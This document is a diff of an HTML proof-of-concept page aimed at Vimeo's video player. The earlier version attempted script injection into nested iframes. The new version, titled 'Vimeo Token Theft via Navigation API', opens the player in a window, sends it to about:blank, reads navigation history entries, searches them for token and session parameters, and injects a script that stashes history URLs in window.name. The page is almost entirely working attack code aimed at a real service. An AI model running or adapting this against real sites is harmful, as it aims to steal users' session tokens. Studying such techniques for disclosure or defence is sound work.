@@ -1,56 +1,118 @@
 <!DOCTYPE html>
 <html>
-<head><title>Dangling iframe Test</title></head>
+<head>
+    <title>Vimeo Navigation API History Leak</title>
+</head>
 <body>
-    <h1>Testing Dangling iframe on Vimeo</h1>
+    <h1>🚨 Vimeo Token Theft via Navigation API</h1>
+    <button onclick="attack()">Start Attack</button>
     <div id="log"></div>
-    
-    <iframe id="vimeo" src="https://player.vimeo.com/video/935884964"></iframe>
-    
+
     <script>
-        const log = document.getElementById('log');
-        const vimeoFrame = document.getElementById('vimeo');
-        
-        function addLog(msg) {
-            log.innerHTML += `<p>${msg}</p>`;
+        function log(msg) {
+            document.getElementById('log').innerHTML += `<p>${msg}</p>`;
             console.log(msg);
         }
-        
-        setTimeout(() => {
-            const win = vimeoFrame.contentWindow;
+
+        function attack() {
+            log('🎯 Step 1: Opening Vimeo player in new window...');
             
-            addLog(`Nested frames count: ${win.length}`);
+            // Open Vimeo player
+            const vimeoWin = window.open(
+                'https://player.vimeo.com/video/935884964',
+                'vimeoTarget'
+            );
             
-            // Try each nested frame
-            for(let i = 0; i < win.length; i++) {
-                try {
-                    addLog(`Attempting frame ${i}...`);
+            // Wait for it to load
+            setTimeout(() => {
+                log('📡 Step 2: Hijacking window to about:blank...');
+                
+                // Change to about:blank (changes ownership!)
+                vimeoWin.location = 'about:blank';
+                
+                setTimeout(() => {
+                    log('🔍 Step 3: Extracting navigation history...');
                     
-                    // Set to about:blank
-                    win[i].location = 'about:blank';
-                    
-                    setTimeout(() => {
-                        try {
-                            const name = win[i].name;
-                            addLog(`✅ Frame ${i} name: ${name}`);
+                    try {
+                        // Check if Navigation API is available
+                        if (vimeoWin.navigation && vimeoWin.navigation.entries) {
+                            const entries = vimeoWin.navigation.entries();
                             
-                            // Try to read more
-                            addLog(`Frame ${i} location: ${win[i].location.href}`);
+                            log(`✅ Found ${entries.length} history entries`);
                             
-                            // Try to inject script
-                            const doc = win[i].document;
-                            doc.write('<script>alert("Owned frame ' + i + '!")</scr' + 'ipt>');
+                            // Extract URLs from history
+                            entries.forEach((entry, i) => {
+                                const url = new URL(entry.url);
+                                log(`Entry ${i}: ${url.href}`);
+                                
+                                // Check if URL contains tokens
+                                // Sometimes tokens are in URL fragments or query params
+                                if (url.hash.includes('token') || 
+                                    url.search.includes('token') ||
+                                    url.search.includes('session')) {
+                                    log(`🚨 POTENTIAL TOKEN IN URL: ${url.href}`);
+                                }
+                                
+                                // Extract any query parameters
+                                url.searchParams.forEach((value, key) => {
+                                    log(`  ${key}: ${value}`);
+                                });
+                            });
                             
-                        } catch(e) {
-                            addLog(`❌ Cannot read frame ${i}: ${e.message}`);
+                            // Try to access navigation state
+                            if (vimeoWin.navigation.currentEntry) {
+                                const state = vimeoWin.navigation.currentEntry.getState();
+                                log('Navigation state:', JSON.stringify(state));
+                            }
+                            
+                            // CRITICAL: Try to read window.name
+                            log('Window name:', vimeoWin.name);
+                            
+                            // CRITICAL: Try to inject script to extract playerConfig
+                            tryExtractConfig(vimeoWin);
+                            
+                        } else {
+                            log('❌ Navigation API not available');
                         }
-                    }, 1000);
+                    } catch(e) {
+                        log('❌ Error: ' + e.message);
+                    }
+                }, 2000);
+            }, 3000);
+        }
+        
+        function tryExtractConfig(win) {
+            try {
+                // We now own this window, so we can inject script!
+                const script = win.document.createElement('script');
+                script.textContent = `
+                    // This script runs with about:blank origin
+                    // But navigation.entries() leaked the Vimeo URLs!
                     
-                } catch(e) {
-                    addLog(`❌ Frame ${i} error: ${e.message}`);
-                }
+                    // Try to navigate back to Vimeo
+                    if (window.navigation && window.navigation.entries().length > 0) {
+                        // Store what we want to extract in window.name
+                        window.name = JSON.stringify({
+                            historyUrls: window.navigation.entries().map(e => e.url)
+                        });
+                        
+                        // Navigate back to the first entry
+                        window.history.back();
+                    }
+                `;
+                win.document.head.appendChild(script);
+                
+                log('✅ Injected script into hijacked window');
+                
+                // After navigating back, check window.name again
+                setTimeout(() => {
+                    log('Window name after back:', win.name);
+                }, 3000);
+                
+            } catch(e) {
+                log('❌ Script injection failed: ' + e.message);
             }
-        }, 3000);
+        }
     </script>
 </body>
 </html>
